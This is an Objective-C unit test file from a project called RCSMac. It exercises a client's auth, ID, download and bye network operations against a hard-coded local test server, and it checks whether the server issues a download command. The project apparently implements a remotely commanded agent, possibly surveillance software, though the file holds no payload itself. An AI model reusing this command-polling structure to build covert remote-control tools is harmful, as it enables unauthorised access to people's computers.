//
//  DownloadNetworkOperationTest.m
//  RCSMac
//
//  Created by revenge on 1/25/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import <Cocoa/Cocoa.h>

#import <GHUnit/GHUnit.h>
#import <OCMock/OCMock.h>

#import "RCSMCommon.h"
#import "RESTTransport.h"
#import "AuthNetworkOperation.h"
#import "IDNetworkOperation.h"
#import "ByeNetworkOperation.h"
#import "DownloadNetworkOperation.h"
#import "RCSMTaskManager.h"


static NSURL *mURL                      = nil;
static RESTTransport *mTransport        = nil;
static AuthNetworkOperation *mAuth      = nil;
static IDNetworkOperation *mID          = nil;
static DownloadNetworkOperation *mDown  = nil;
static ByeNetworkOperation *mBye        = nil;

@interface DownloadNetworkOperationTest : GHTestCase

@end

@implementation DownloadNetworkOperationTest

- (BOOL)shouldRunOnMainThread
{
  // By default NO, but if you have a UI test or test dependent on running on the main thread return YES
  return NO;
}

- (void)setUpClass
{
  // Run at start of all tests in the class
  mURL = [[NSURL alloc] initWithString: @"http://192.168.1.153:8080/"];
}

- (void)tearDownClass
{
  // Run at end of all tests in the class
  GHTestLog(@"mURL: %@", mURL);
  [mURL release];
}

- (void)setUp
{
  // Run before each test method
  mTransport = [[RESTTransport alloc] initWithURL: mURL
                                           onPort: 8080];
  
  mAuth  = [[AuthNetworkOperation alloc]
            initWithTransport: mTransport];
  mID    = [[IDNetworkOperation alloc]
            initWithTransport: mTransport];
  mDown  = [[DownloadNetworkOperation alloc]
            initWithTransport: mTransport];
  mBye   = [[ByeNetworkOperation alloc]
            initWithTransport: mTransport];
}

- (void)tearDown
{
  // Run after each test method
  [mAuth release];
  [mID release];
  [mDown release];
  [mBye release];
  [mTransport release];
}

- (void)testAllocation
{
  RESTTransport *transport = [[RESTTransport alloc] initWithURL: mURL
                                                         onPort: 80];
  
  DownloadNetworkOperation *downOP = [[DownloadNetworkOperation alloc]
                                      initWithTransport: transport];
  
  GHAssertNotNULL(downOP, nil, @"Error on allocation");
  
  [transport release];
  [downOP release];
}

- (void)testPerform
{
  BOOL result = NO;
  
  result = [mAuth perform];
  GHAssertTrue(result, @"Auth went wrong");
  
  result = [mID perform];
  GHAssertTrue(result, @"idOP went wrong");
  
  NSMutableArray *commandList = [mID getCommands];
  GHTestLog(@"commandList: %@", commandList);
  
  int i = 0;
  
  for (; i < [commandList count]; i++)
    {
      if ([[commandList objectAtIndex: i] unsignedIntValue] == PROTO_DOWNLOAD)
        {
          GHTestLog(@"Server requested a file download");
          
          result = [mDown perform];
          GHAssertTrue(result, @"downOP went wrong");
          
          i = 1337;
          break;
        }
    }
  
  result = [mBye perform];
  GHAssertTrue(result, @"Bye went wrong");
  
  GHAssertEquals(i, 1337, @"No request from server for PROTO_DOWNLOAD");
}

- (void)testWithNoRequestFromServer
{
  BOOL result = NO;
  
  result = [mAuth perform];
  GHAssertTrue(result, @"Auth went wrong");
  
  result = [mID perform];
  GHAssertTrue(result, @"idOP went wrong");
  
  NSMutableArray *commandList = [mID getCommands];
  GHTestLog(@"commandList: %@", commandList);
  
  int i = 0;
  
  for (; i < [commandList count]; i++)
    {
      if ([[commandList objectAtIndex: i] unsignedIntValue] == PROTO_DOWNLOAD)
        {
          i = 1337;
          break;
        }
    }
  
  GHAssertNotEquals(i, 1337, @"Server requested PROTO_DOWNLOAD, can't continue");
  
  result = [mDown perform];
  GHAssertFalse(result, @"downOP should have returned FALSE");
  
  result = [mBye perform];
  GHAssertTrue(result, @"Bye went wrong");
}


@end